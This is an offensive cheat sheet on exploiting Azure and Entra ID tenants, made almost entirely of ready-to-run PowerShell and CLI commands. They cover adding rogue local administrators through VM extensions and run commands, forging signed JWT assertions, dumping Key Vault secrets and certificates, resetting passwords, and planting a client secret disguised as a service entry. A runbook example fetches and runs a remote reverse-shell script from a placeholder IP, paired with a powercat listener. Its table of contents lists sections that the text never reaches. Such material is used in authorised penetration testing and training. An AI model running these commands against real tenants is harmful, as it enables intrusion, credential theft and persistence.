# Exploitation & Privilege escalation
* [General](#General)
  * [Requesting access tokens](#Requesting-access-tokens)
* [Exploitation Enumeration](#Exploitation-Enumeration)
  * [When on a new machine](#When-on-a-new-machine)
  * [After getting a new user](#After-getting-a-new-user)
* [Azure AD](#Azure-AD-Exploitation)
  * [Managed Identity](#Managed-Identity)
  * [Abusing dynamic groups](#Abusing-dynamic-groups)
  * [Illicit Consent Grant](#Illicit-Consent-Grant)
  * [JWT assertion Key vault sign permissions](#JWT-assertion-Key-vault-sign-permissions)
  * [Attribute-based Access Control tag abuse](#Attribute-based-Access-Control-tag-abuse)
  * [Privileged Roles & Privileges](#Privileged-Roles-&-Privileges)
    * [Reset Password](#Reset-Password)
    * [Add client secret to application](#Add-client-secret-to-application)
    * [Add member to group](#Add-member-to-group)
    * [Temporary Access Pass](#Temporary-Access-Pass)
  * [Abuse Claims nOAuth](#Abuse-Claims-nOAuth)
* [Azure Resources Exploitation](#Azure-Resources-Exploitation)
  * [Storage account](#Storage-account)
  * [Key Vault](#Key-Vault)
  * [Automation account](#Automation-account)
    * [Runbook](#Runbook)
    * [Extract credentials](#Extract-credentials)
    * [Read Jobs](#Read-Jobs)
  * [Virtual Machines](#Virtual-Machines)
  * [Deployments](#Deployments)
  * [Arm Templates History](#Arm-Templates-History)
  * [Function apps continuous deployment](#Function-apps-continuous-deployment)
  * [Logic App](#Logic-App)
  * [Azure Container Registry dump](#Azure-Container-Registry-dump)
  * [Azure ARC](#Azure-ARC)
  * [Kubernetes](#Kubernetes)
  * [File Shares](#File-shares)
  * [Azure SQL](#Azure-SQL)
  * [Silver SAML](#Silver-SAML)
* [Office 365](#Office-365)
  * [Updateable groups](#Updateable-groups)

## General
## Exploitation Enumeration
### When on a new machine
### Get machine info
```
systeminfo
```

#### Check if Azure or Domain joined
```
dsregcmd /status
```

#### Get context of current user
```
az ad signed-in-user show
Get-AzContext
```

#### Check UserData
```
$userData = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text";[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))
```

#### Modify UserData
```
## It is also possible to modify user data with permissions "Microsoft.Compute/virtualMachines/write" on the target VM. Any automation or scheduled task reading commands from user data can be abused!

$data = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("whoami"))
$accessToken = (Get-AzAccessToken).Token
$Url = "https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/jumpvm?api-version=2021-07-01"
$body = @(
@{
location = "Germany West Central"
properties = @{
userData = "$data"
}
}
) | ConvertTo-Json -Depth 4

$headers = @{
Authorization = "Bearer $accessToken"
}

## Execute Rest API Call

$Results = Invoke-RestMethod -Method Put -Uri $Url -Body $body -Headers $headers -ContentType 'application/json'
```

#### Check VM Extensions
```
Get-AzVMExtension -ResourceGroupName <RESEARCH GROUP NAME> -VMName <VM NAME>
```

#### Set VM Extensions
```
#Following permissions are required to create a custom script extension and read the output: "Microsoft.Compute/virtualMachines/extensions/write" and "Microsoft.Compute/virtualMachines/extensions/read"

Set-AzVMExtension -ResourceGroupName <RESEARCH GROUP NAME> -VMName <VM NAME> -ExtensionName ExecCmd -Location germanywestcentral -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users <NEW USER> <PASSWORD> /add /Y; net localgroup administrators <NEW USER> /add /Y"}'
```

#### Get access token
Supported tokens = aad-graph, arm, batch, data-lake, media, ms-graph, oss-rdbms
```
az account get-access-token
az account get-access-token --resource-type ms-graph 
```

#### Check if server has a managed identity
- print environment variables and check for `IDENTITY_HEADER` and `IDENTITY_ENDPOINT` variables exist.
```
env
```

### After getting a new user / managed identity
#### Check for other tenants
- Login to the Azure portal and in the right top click on the user and then `Switch Directory`.
```
Get-AzTenant
```

#### List all accessible resources
- Or login in https://portal.azure.com and click all resources
```
Get-AzResource

az resource list
```

#### List all owned objects
```
az ad signed-in-user list-owned-objects

Get-AzureADUserOwnedObject -ObjectId <ID>
```

#### Check permissions on the resource
```
Get-AzRoleAssignment -Scope <RESOURCE ID>

az role assignment list
```

##### Get current Azure role assignments
```
Get-AzRoleAssignment
```

#### Get Entra ID role assignments for objectID
```
Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq '<OBJECT ID>'" | ForEach-Object {
	$roleDef = Get-MgRoleManagementDirectoryRoleDefinition -UnifiedRoleDefinitionId $_.RoleDefinitionId
	[PSCustomObject]@{
		RoleDisplayName = $roleDef.DisplayName
		RoleId = $roleDef.Id
		DirectoryScopeId = $_.DirectoryScopeId
	}
} | Select-Object RoleDisplayName, RoleId, DirectoryScopeId | fl
```

#### Check API permissions / App Role Assignments for OBJECT ID
```
Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId <OBJECT ID>
```

#### Get the role definition
```
Get-AzRoleDefinition -Id <ROLEDEFINITION ID>
```

#### Check if it can read any deployment
```
Get-AzResourceGroupDeployment -ResourceGroupName <RESOURCEGROUP>
```

#### Get the allowed actions on the role definition
```
Get-AzRoleDefinition -Name "<ROLE DEFINITION NAME>"
```

## Azure AD Exploitation
## Managed Identity
- Managed identity = Workload identity = Service principals
	- Entra ID Enterprise Applications and App registrations are workload identities
- Application permissions - also called Role assignments. There are two types of permissions:
	- Delegated permissions - Used for Delegated Access (access on behalf of a user). Needs user or admin consent.
	- Application permissions - Used for App-only access (access without a user). Needs admin consent.
	- [Documentation](https://learn.microsoft.com/en-us/entra/identity-platform/permissions-consent-overview)
- Applications permissions are often granted for automation or lazy admins wanting to authenticate with a script.
- Rarely has MFA as it requires Workload Identities Premium licenses for each identity
- Compromise of any overly permissive application would result in access to more resources and roles.

#### Check if server has a managed identity
- print environment variables and check for `IDENTITY_HEADER` and `IDENTITY_ENDPOINT` variables exist.
```
env
```

#### Request access token(s) for managed identity
- See [Requesting access tokens](#Requesting-access-tokens)

#### Authenticate with Service Principal / Managed Identity
- With cleartext credentials.
```
$password = ConvertTo-SecureString '<SECRET>' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('<ACCOUNT ID>', $password)
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant <TENANT ID>
```

- With Access tokens
- Account ID can be found in `Client_ID` value from requesting the tokens.
```
$mgmtToken = <TOKEN>
$graphToken = <TOKEN>
Connect-AzAccount -AccessToken $mgmtToken -GraphAccessToken $graphToken -AccountId <ID>
```

- Using certificate
```
Connect-AzAccount -ServicePrincipal -ApplicationId <APP ID> -Tenant <TENANT ID> -CertificatePath <PATH TO CERT>
```

#### Use the AZ module to exploit the permissions this managed identity may have!
- Example: Check for resources it can access
- See [Exploitation Enumeration](#Exploitation Enumeration)
```
Get-AzResource
```

## Abusing dynamic groups
- By default, any user can invite guests in Azure AD. If a dynamic group rule allows adding users based on the attributes that a guest user can modify, it will result in abuse of this feature. For example based on EMAIL ID and join as guest that matches that rule.

#### Check if there are dynamic groups
```
import-module .\AzureADPreview.psd1
Get-AzureADMSGroup | Where-Object -Property GroupTypes -Match 'DynamicMembership' | fl *
```
- Os it possible to invite a user that complies to the rule?

#### Invite users
- Go to Users and select "New Guest User"
- Open the user's profile and click on "(manage)" under invitation accepted. Select YES on resend invite and copy the URL.
- Open the URL in a private browser and login and accept the permissions.
- Connect to the tenant with AzureAD
- Set the secondary email for the user (Get the objectID of the user from the portal where we made the guest)
```
Set-AzureADUser -ObjectId <ID> -OtherMails <EMAIL> -Verbose
```
- Check if the user is added to the dynamic group (Might take a bit)

## Illicit Consent Grant
- If app registration is allowed for users [link](https://portal.azure.com/#view/Microsoft_AAD_IAM/ActiveDirectoryMenuBlade/~/UserSettings) and you can enumerate AD users/emails you can perform Illicit Consent Grant Phishing with an app from inside the tenant.
- [Link to initial access attacks](../initial-access-attacks.md#Illicit-Consent-Grant-phishing) to the attack from Initial Access Attacks
- Use `Accounts in this organizational directory only (<TENANT NAME> only - Single tenant)` since its from inside the tenant already!

## JWT assertion Key vault sign permissions
- Perform JWT assertion with only certificate read sign permissions. So not able to export the private key!
- Requires permissions
	- `Microsoft.KeyVault/vaults/certificates/read`
	- `Microsoft.KeyVault/vaults/keys/read`
	- `Microsoft.KeyVault/vaults/keys/sign/action`

#### Check permissions
```
$Name = "<RESOURCE NAME>"
$ARMAccessToken = "<TOKEN>"

$Resource = Get-AzResource -Name $Name
$SubscriptionID = (Get-AzSubscription).Id
$ResourceGroupName = $Resource.ResourceGroupName
$ResourceName = $Resource.Name
$ResourceProviderNamespace = $Resource.ResourceType

$URI = "https://management.azure.com/subscriptions/$SubscriptionID/resourcegroups/$ResourceGroupName/providers/$ResourceProviderNamespace/$ResourceName/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
$RequestParams = @{
	Method = 'GET'
	Uri = $URI
	Headers = @{
		'Authorization' = "Bearer $ARMAccessToken"
	}
}
$Permissions = (Invoke-RestMethod @RequestParams).value

$Permissions | fl *
```

#### Request key vault access token
```
$KeyVaultAccessToken = New-AccessToken -clientCertificate $clientCertificate -tenantID <ID> -appID <ID> -scope 'https://vault.azure.net/.default'

$KeyVaultAccessToken
```

#### List certificates using API
- Requires permissions
	- `Microsoft.KeyVault/vaults/certificates/read`

```
$Vaultname = ""

$URI = "https://$Vaultname.vault.azure.net/certificates?api-version=7.4"
$RequestParams = @{
	Method = 'GET'
	Uri = $URI
	Headers = @{
	'Authorization' = "Bearer $KeyVaultAccessToken"
}
ContentType = "application/json"
}
$KVInfo = (Invoke-RestMethod @RequestParams).value
$KVInfo
```

#### Load certificates details using API
- Load the function

```
function Get-AKVCertificate($kvURI, $KeyVaultAccessToken, $keyName) {
	$uri = "$($kvURI)/certificates?api-version=7.4"
	$httpResponse = Invoke-WebRequest -Uri $uri -Headers @{ 
		'Authorization' ="Bearer $($KeyVaultAccessToken)" 
	}
	$certs = $httpResponse.Content | ConvertFrom-Json
	$certUri = $certs.Value | where {$_.id -like "*$($keyName)*"}
	Write-Output $certUri
	$httpResponse = Invoke-WebRequest -Uri "$($certUri.id)?api-version=7.3" -Headers @{ 'Authorization' = "Bearer $($KeyVaultAccessToken)" }
	
return $httpResponse.Content | ConvertFrom-Json
}
```

- `kvURI` used `$Vaultname` from previous commands
- `keyName` from the URL of the id value after `/certificates/<keyName>`
```
$AKVCertificate = Get-AKVCertificate -kvURI "https://$Vaultname.vault.azure.net" -KeyVaultToken $KeyVaultAccessToken -keyName '<CERT NAME>'

$AKVCertificate | fl *
```

#### Construct JWT token and sign it using Key Vault Operation
- Requirements
	- Certificate details from command above
	- App ID of target application the cert is from
	- Sign permission `Microsoft.KeyVault/vaults/keys/sign/action`
	- Tenant ID
	- Key vault access token in `$KeyVaultAccessToken`

```
$AppID = '<APP ID>'
$TenantID = '<TENANT ID>'

# Taken from https://www.huntandhackett.com/blog/researching-access-tokens-for-fun-and-knowledge

$audience = "https://login.microsoftonline.com/$TenantID/oauth2/token"

# JWT request should be valid for max 2 minutes.
$StartDate = (Get-Date "1970-01-01T00:00:00Z" ).ToUniversalTime()
$JWTExpirationTimeSpan = (New-TimeSpan -Start $StartDate -End (Get-Date).ToUniversalTime().AddMinutes(2)).TotalSeconds
$JWTExpiration = [math]::Round($JWTExpirationTimeSpan,0)

# Create a NotBefore timestamp.
$NotBeforeExpirationTimeSpan = (New-TimeSpan -Start $StartDate -End ((Get-Date).ToUniversalTime())).TotalSeconds
$NotBefore = [math]::Round($NotBeforeExpirationTimeSpan,0)

# Create JWT header
$jwtHeader = @{
	'alg' = "RS256" # Use RSA encryption and SHA256 as hashing algorithm
	'typ' = "JWT" # We want a JWT
	'x5t' = $AKVCertificate.x5t[0] # The pubkey hash we received from Azure Key Vault
}

# Create the payload
$jwtPayLoad = @{
	'aud' = $audience # Points to oauth token request endpoint for your tenant
	'exp' = $JWTExpiration # Expiration of JWT request
	'iss' = $AppID # The AppID for which we request a token for
	'jti' = [guid]::NewGuid() # Random GUID
	'nbf' = $NotBefore # This should not be used before this timestamp
	'sub' = $AppID # Subject
}

# Convert header and payload to json and to base64
$jwtHeaderBytes = [System.Text.Encoding]::UTF8.GetBytes(($jwtHeader | ConvertTo-Json))
$jwtPayloadBytes = [System.Text.Encoding]::UTF8.GetBytes(($jwtPayLoad | ConvertTo-Json))
$b64JwtHeader = [System.Convert]::ToBase64String($jwtHeaderBytes)
$b64JwtPayload = [System.Convert]::ToBase64String($jwtPayloadBytes)

# Concat header and payload to create an unsigned JWT and compute a Sha256hash
$unsignedJwt = $b64JwtHeader + "." + $b64JwtPayload
$unsignedJwtBytes = [System.Text.Encoding]::UTF8.GetBytes($unsignedJwt)
$hasher = [System.Security.Cryptography.HashAlgorithm]::Create('sha256')
$jwtSha256Hash = $hasher.ComputeHash($unsignedJwtBytes)
$jwtSha256HashB64 = [Convert]::ToBase64String($jwtSha256Hash) -replace '\+','-' -replace '/','_' -replace '='

# Sign the sha256 of the unsigned JWT using the certificate in Azure Key Vault
$uri = "$($AKVCertificate.kid)/sign?api-version=7.3"
$headers = @{
	'Authorization' = "Bearer $KeyVaultAccessToken"
	'Content-Type' = 'application/json'
}

$response = Invoke-RestMethod -Uri $uri -UseBasicParsing -Method POST -Headers $headers -Body (([ordered] @{
	'alg' = 'RS256'
	'value' = $jwtSha256HashB64
}) | ConvertTo-Json)
$signature = $response.value

# Concat the signature to the unsigned JWT
$signedJWT = $unsignedJwt + "." + $signature
```

#### Request new access token for arm endpoint
- Uses `$AppID` and `$TenantID` from previous command
```
$uri = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
$headers = @{'Content-Type' = 'application/x-www-form-urlencoded'}
$response = Invoke-RestMethod -Uri $uri -UseBasicParsing -Method POST -Headers $headers -Body ([ordered]@{
	'client_id' = $AppID
	'client_assertion' = $signedJWT
	'client_assertion_type' = 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer'
	'scope' = 'https://management.azure.com/.default'
	'grant_type' = 'client_credentials'
})

$ArmAccessToken = "$($response.access_token)"
$ArmAccessToken
```

#### Authenticate
- Uses `$AppID` from previous command
```
Connect-AzAccount -AccessToken $ArmAccessToken -AccountId $AppID
```

#### Request other endpoints using JWT-assertion
- [Link to endpoints](/azure/readme.md#Endpoints)
- Uses `AppID` and `$TenantID` variables from previous commands

```
$AppID = '<APP ID>'
$TenantID = '<TENANT ID>'
$Endpoint = '<ENDPOINT>'

$uri = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
$headers = @{'Content-Type' = 'application/x-www-form-urlencoded'}
$response = Invoke-RestMethod -Uri $uri -UseBasicParsing -Method POST -Headers $headers -Body ([ordered]@{
	'client_id' = $AppID
	'client_assertion' = $signedJWT
	'client_assertion_type' = 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer'
	'scope' = "$Endpoint"
	'grant_type' = 'client_credentials'
})

$NewAccessToken = "$($response.access_token)"
$NewAccessToken
```

## Attribute based Access Control tag abuse
- ABAC builds on RBAC and provides fine-grained access control based on attributes of a resource, security principal and environment. Uses role assignment conditions.
- Requires permissions
	- `<RESOURCE>/tags/write` permissions

#### Check if ABAC is present
- Check the condition rule

```
Get-AzRoleAssignment

# EXAMPLE:
Condition : ((!(ActionMatches{'Microsoft.Storage/storageAccounts/blobServices/containers/blobs/read'} AND NOT SubOperationMatches{'Blob.List'})) OR                     (@Resource[Microsoft.Storage/storageAccounts/blobServices/containers/blobs/tags:Department<$key_case_sensitive$>] StringEquals 'STRING'))
```

#### Enumerate exact actions
```
Get-AzResource
```

```
$Name = "<RESOURCE NAME>"
$AccessToken = "<TOKEN>"

$Resource = Get-AzResource -Name $Name
$SubscriptionID = (Get-AzSubscription).Id
$ResourceGroupName = $Resource.ResourceGroupName
$ResourceName = $Resource.Name
$ResourceProviderNamespace = $Resource.ResourceType

$URI = "https://management.azure.com/subscriptions/$SubscriptionID/resourcegroups/$ResourceGroupName/providers/$ResourceProviderNamespace/$ResourceName/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
$RequestParams = @{
	Method = 'GET'
	Uri = $URI
	Headers = @{
		'Authorization' = "Bearer $AccessToken"
	}
}
$Permissions = (Invoke-RestMethod @RequestParams).value

$Permissions | fl *
```

#### Request token for Storage
```
$AppID = '<APP ID>'
$TenantID = '<TENANT ID>'
$Endpoint = 'https://storage.azure.com/.default'

$uri = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
$headers = @{'Content-Type' = 'application/x-www-form-urlencoded'}
$response = Invoke-RestMethod -Uri $uri -UseBasicParsing -Method POST -Headers $headers -Body ([ordered]@{
	'client_id' = $AppID
	'client_assertion' = $signedJWT
	'client_assertion_type' = 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer'
	'scope' = "$Endpoint"
	'grant_type' = 'client_credentials'
})

$StorageAccessToken = "$($response.access_token)"
$StorageAccessToken
```

#### Enumerate container names
- Requirements:
	- Uses `$Name` from previous command.
	- Requires Storage Account Access token in `$StorageAccessToken`
- Check for the string between `<name>STRING</name>`

```
$StorageAccountName = $Name
$URL = "https://$StorageAccountName.blob.core.windows.net/?comp=list"

$Params = @{
	"URI" = $URL
	"Method" = "GET"
	"Headers" = @{
		"Content-Type" = "application/json"
		"Authorization" = "Bearer $StorageAccessToken"
		"x-ms-version" = "2017-11-09"
		"accept-encoding" = "gzip, deflate"
	}
}
$Result = Invoke-RestMethod @Params -UseBasicParsing
$Result
```

#### Enumerate files
- Uses `$StorageAccountName` and `$StorageAccessToken` from previous command

```
$ContainerName = "<NAME>"

$URL = "https://$StorageAccountName.blob.core.windows.net/$Containername" + "?restype=container&comp=list"

$Params = @{
	"URI" = $URL
	"Method" = "GET"
	"Headers" = @{
		"Content-Type" = "application/json"
		"Authorization" = "Bearer $StorageAccessToken"
		"x-ms-version" = "2017-11-09"
		"accept-encoding" = "gzip, deflate"
	}
}
$XML = Invoke-RestMethod @Params -UseBasicParsing


#Remove BOM characters and list Blob names

$XML.TrimStart([char]0xEF,[char]0xBB,[char]0xBF) | Select-Xml -XPath "//Name" | foreach {$_.node.InnerXML}
```

#### Read file
- Uses `$StorageAccountName`, `$Containername`, `$Filename` and `$StorageAccessToken` from previous command
- Should receive the error `Invoke-RestMethod : AuthorizationPermissionMismatchThis request is not authorized to perform this operation using this permission.`

```
$Filename = "<FILENAME>"

$URL = "https://$StorageAccountName.blob.core.windows.net/$Containername/$Filename"
$Params = @{
	"URI" = $URL
	"Method" = "GET"
	"Headers" = @{
		"Content-Type" = "application/json"
		"Authorization" = "Bearer $StorageAccessToken"
		"x-ms-version" = "2017-11-09"
		"accept-encoding" = "gzip, deflate"
	}
}

Invoke-RestMethod @Params -UseBasicParsing
```

#### Add ABAC tags to file
- Uses `$StorageAccountName`, `$Containername`, `$Filename` and `$StorageAccessToken` from previous command
- Adds the value `<STRING>` to the `Department` tag

```
$URL = "https://$StorageAccountName.blob.core.windows.net/$Containername/$Filename" + "?comp=tags"
$Params = @{
	"URI" = $URL
	"Method" = "PUT"
	"Headers" = @{
		"Content-Type" = "application/xml; charset=UTF-8"
		"Authorization" = "Bearer $StorageAccessToken"
		"x-ms-version" = "2020-04-08"
	}
}
$Body = @"
<?xml version="1.0" encoding="utf-8"?>
	<Tags>
		<TagSet>
			<Tag>
				<Key>Department</Key>
				<Value><STRING></Value>
			</Tag>
		</TagSet>
	</Tags>
"@

Invoke-RestMethod @Params -UseBasicParsing -Body $Body
```

#### Read file
- Uses `$StorageAccountName`, `$Containername`, `$Filename` and `$StorageAccessToken` from previous command

```
$URL = "https://$StorageAccountName.blob.core.windows.net/$Containername/$Filename"
$Params = @{
	"URI" = $URL
	"Method" = "GET"
	"Headers" = @{
		"Content-Type" = "application/json"
		"Authorization" = "Bearer $StorageAccessToken"
		"x-ms-version" = "2017-11-09"
		"accept-encoding" = "gzip, deflate"
	}
}

Invoke-RestMethod @Params -UseBasicParsing
```


## Privileged Roles & Privileges
### Reset Password
- Requires Role: Helpdesk Administrator, Authentication Administrator, User Administrator or Password admin
- https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5

![image](https://github.com/0xJs/RedTeaming_CheatSheet/assets/43987245/6be97cfc-2480-48a7-a60c-355f2cbe4d46)

```
$Password = '<NEW PASSWORD>'

$PasswordProfile = @{
	forceChangePasswordNextSignIn = $false
	password = $Password
}

Update-MgUser -UserId <USER ID / UPN> -PasswordProfile $PasswordProfile -Verbose
```

### Add client secret to application
- Requires role: Application Administrator

#### Check application id
- Note down APP id

```
Get-MgApplication -ApplicationId <OBJECT ID>
```

#### Add client secret
```
$PasswordCred = @{
	displayName = 'Added by Azure Service Bus - DO NOT DELETE'
	endDateTime = (Get-Date).AddMonths(6)
}

$data = Add-MgApplicationPassword -ApplicationId <OBJECT ID> -PasswordCredential $PasswordCred
$data

$data.SecretText
```

#### Authenticate
```
$password = ConvertTo-SecureString '<SecretText>' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('<APP ID>', $password)

Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant <ID>

Connect-MgGraph -ClientSecretCredential $creds -TenantId <ID>
```

#### Login with user
```
$password = ConvertTo-SecureString $data.SecretText -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('<OBJECT ID>', $password)
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant <TENANT ID>
```

### Add member to group
- Requires to be owner of a group
- Requites permissions:
	- `microsoft.directory/groups.security.assignedMembership/members/update` 
	- `microsoft.directory/groups.security/members/update`
	- `microsoft.directory/groups/members/update`

```
New-MgGroupMember -GroupId <GROUP OBJECT ID> -DirectoryObjectId <TARGET OBJECT ID> -Verbose
```

### Temporary Access Pass
- Create temp pass:
	- Global Administrators, Privileged Authentication Administrators, Authentication Administrators or permissions `UserAuthenticationMethod.ReadWriteAll`
- Read TAP policy
	- A global reader or role with `Policy.Read.All` can read TAP policy
- [Link to defense evasion](/azure/defense-evasion.md#Temporary-Access-Pass)

## Abuse Claims nOAuth
- Abusing claims is possible if they aren't handled correctly
	- A mutable claim like `email`, `preferred_username` or `unique_name` is used for user identification or authorization (termed false identifier anti-pattern by MS)
	- A misconfigured or malicious claims transformation (customizing use of claims by specific application) can be abused for account takeover or privilege escalation
	- Optional claims may also end up having sensitive information and unnecessary high privileges

### nOAuth
- In Microsoft Azure AD, the email claim is both mutable and unverified so it should never be trusted or used as an identifier
	- If an Azure AD application uses email as identifier, it is vulnerable to nOAuth
	- An attacker can assign a target’s email to their user in their own Azure AD tenant and use that to access the target Azure AD application in another tenant as the target user.
- In MS documentation there is a warning to not use email as identifier!
- https://www.descope.com/blog/post/noauth
- https://msrc.microsoft.com/blog/2023/06/potential-risk-of-privilege-escalation-in-azure-ad-applications/

#### Change e-mail
- Change the e-mail of the user to include the word like `admin` in an attacker tenant (Tenant you own)
	- There is no way to enumerate this for a azure web application!
- Not possible to user email of other user if verified domain. Since June 2023 email addresses with unverified domain are removed from the tokens. However, if required it can be turned off.

#### Login to webapp
- Then login to the webapp

## Azure Resource Exploitation
## Storage account
#### List storage accounts
```
Get-AzStorageAccount
```

#### Store context
```
$context = New-AzStorageContext -StorageAccountName <RESOURCE NAME>
```

#### Check if there is a container that is acccessible
```
Get-AzStorageContainer -Context $context
```

#### List blobs
```
Get-AzStorageBlob -Container <NAME> -Context $context
```

#### Retrieve files
```
Get-AzStorageBlobContent -Container <NAME> -Context $context -Blob <NAME> -Verbose
```

#### Access Storage Account
- https://azure.microsoft.com/en-us/products/storage/storage-explorer/
- To connect with a account use the Subcription button.

#### Check if you can access storage account keys
```
Get-AzStorageAccountKey -name <NAME OF STORAGE> -resourcegroupname <NAME>
```

#### Connect to the storage account with "Storage Explorer" using the account name and account keys

## Key Vault
#### List key vaults
```
Get-AzKeyVault
```

#### Get info about a specific key vault
```
Get-AzKeyVault -VaultName <VAULT NAME>
```

#### List the saved credentials
```
Get-AzKeyVaultSecret -VaultName <VAULT NAME> -AsPlainText
```

#### Read creds
```
Get-AzKeyVaultSecret -VaultName <VAULT NAME> -Name <NAME> -AsPlainText
```

#### List saved certificates 
```
Get-AzKeyVaultCertificate -VaultName <VAULT NAME>
```

#### Read certificate
```
Get-AzKeyVaultSecret -VaultName <VAULT NAME> -Name <CERT NAME> -AsPlainText

$secret = Get-AzKeyVaultSecret -VaultName <VAULT NAME> -Name <CERT NAME> -AsPlainText
$secretByte = [Convert]::FromBase64String($secret)
[System.IO.File]::WriteAllBytes("C:\Users\Public\Cert.pfx", $secretByte)
```

#### Dump certificate info
```
certutil.exe -dump C:\Users\Public\Cert.pfx
```

## Automation account
- Required permissions
	- `Microsoft.Automation/automationAccounts/read`
	- `Microsoft.Automation/automationAccounts/jobs/read`
	- `Microsoft.Automation/automationAccounts/jobs/output/read`
	- `Microsoft.Automation/automationAccounts/runbooks/read`,
	- `Microsoft.Automation/automationAccounts/runbooks/content/read`
- Or required roles:
	- Automation Contributor, Automation Operator, Automation Job Operator
- Automation Account comes very handy in privilege escalation:
  - Run As account is by default contributor on the current subscription and possible to have contributor permissions on other subscriptions in the tenant.   
  - Often, clear-text privileges can be found in Runbooks. For example, a PowerShell runbook may have admin credentials for a VM to use PSRemoting. 
  - Access to connections, key vaults from a runbook. 
  - Ability to run commands on on-prem VMs if hybrid workers are in use.
  - Ability to run commands on VMs using DSC in configuration management.
  - A runbook often contains clear-text passwords for example psremoting!

### General
#### Get information on automation accounts
```
az extension add --upgrade -n automation
az automation account list
```

#### Get the role assigned of the automation accounts
- Check for the Roledefinition
- Get the ID from az automation account list
```
Get-AzRoleAssignment -Scope <ID>
```

#### Check if a hybrid worker is in use by the automation account
```
Get-AzAutomationHybridWorkerGroup -AutomationAccountName <NAME> -ResourceGroupName <NAME>
```

### Runbook
#### Import Powershell runbook
```
Import-AzAutomationRunbook -Name <NAME> -Path <PATH TO .ps1 FILE> -AutomationAccountName <NAME> -ResourceGroupName <NAME> -Type PowerShell -Force -Verbose
```

#### Example contents of .ps1 file
```
IEX (New-Object Net.Webclient).downloadstring("http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1")
```

#### Publish the automation runbook to the vm
```
Publish-AzAutomationRunbook -RunbookName <NAME FOR RUNBOOK> -AutomationAccountName <NAME> -ResourceGroupName <NAME> -Verbose
```

#### Start listener
```
powercat -l -v -p 443 -t 600
```

#### Start the runbook
```
Start-AzAutomationRunbook -RunbookName <NAME OF RUNBOOK> -RunOn <WORKERGROUP NAME> -AutomationAccountName <NAME> -ResourceGroupName <NAME> -Verbose
```

### Extract credentials
- https://github.com/NetSPI/MicroBurst
```
Import-Module Microburst.psm1
Get-AzurePasswords
```

### Read Jobs
- Portal:
	- Open the automation account in the portal and click on "Jobs". Then open the jobs.

- Az Powershell
```
Get-AzAutomationJobOutput
Get-AzAutomationJobOutputRecord
```

- ARM API
```
$JobId = "<JOB ID>"
$Name = "<RESOURCE NAME Microsoft.Automation/automationAccounts>"
$ArmAccessToken = "<TOKEN>"

$Resource = Get-AzResource -Name $Name
$SubscriptionID = (Get-AzSubscription).Id
$ResourceGroupName = $Resource.ResourceGroupName
$ResourceName = $Resource.Name
$ResourceProviderNamespace = $Resource.ResourceType

$URI = "https://management.azure.com/subscriptions/$SubscriptionID/resourcegroups/$ResourceGroupName/providers/$ResourceProviderNamespace/$ResourceName/jobs/$JobId/output?api-version=2023-11-01"
$RequestParams = @{
	Method = 'GET'
	Uri = $URI
	Headers = @{
		'Authorization' = "Bearer $accesstoken"
	}
}
(Invoke-RestMethod @RequestParams)
```

### Read runbook
```
Export-AzAutomationRunbook -Name <RUNBOOK NAME> -AutomationAccountName <AUTOMATION ACCOUNT NAME> -ResourceGroupName <RESOURCE GROUP> -Slot Published -OutputFolder C:\
```

## Virtual Machines
- Vm access can be found after getting a new user or tokens and seeing that it has access to a vm

#### Connect with Az Powershell
```
$accesstoken = ''
Connect-AzAccount -AccessToken $accesstoken -AccountId <ID>
```

#### Get more information about the VM (networkprofile)
```
Get-AzVM -Name <VM NAME> -ResourceGroupName <RESOURCE GROUP NAME> | select -ExpandProperty NetworkProfile
```

#### Get the network interface
```
Get-AzNetworkInterface -Name <NETWORKINTERFACE>
```

#### Query ID of public ip adress to get the public ip
```
Get-AzPublicIpAddress -Name <ID OF PUBLIC IP ADRESSES IN IPCONFIGURATION>
```

#### Check role assignments on the VM
```
Get-AzRoleAssignment -Scope <RESOURCE ID>
```

#### Check the allowed actions of the role definition
```
Get-AzRoleDefinition -Name "<ROLE DEFINITION NAME>"
```

#### Run a command on the VM
```
Invoke-AzVMRunCommand -VMName <VM NAME> -ResourceGroupName <NAME> -CommandId 'RunPowerShellScript' -ScriptPath '<PATH TO .ps1 FILE>' -Verbose
```

#### Contents of adduser.ps1
```
$passwd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
New-LocalUser -Name <USER> -Password $passwd
Add-LocalGroupMember -Group Administrators -Member student38
```

#### Access the VM
```
$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('<USER>', $Password)
$sess = New-PSSession -ComputerName <IP> -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
```

#### Execute privilege escalation or post exploitation

### Login on VM as managed idenity
```
az login –identity
```

#### List permissions of current subscription
- May have more permissions then the user
```
az role assignment list -–assignee ((az account list | ConvertFrom-Json).id)
```

#### If no AZ module can request token manually 
- Then use Azure REST APIs with the token
```
Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -Method GET -Headers @{Metadata="true"} -UseBasicParsing
```

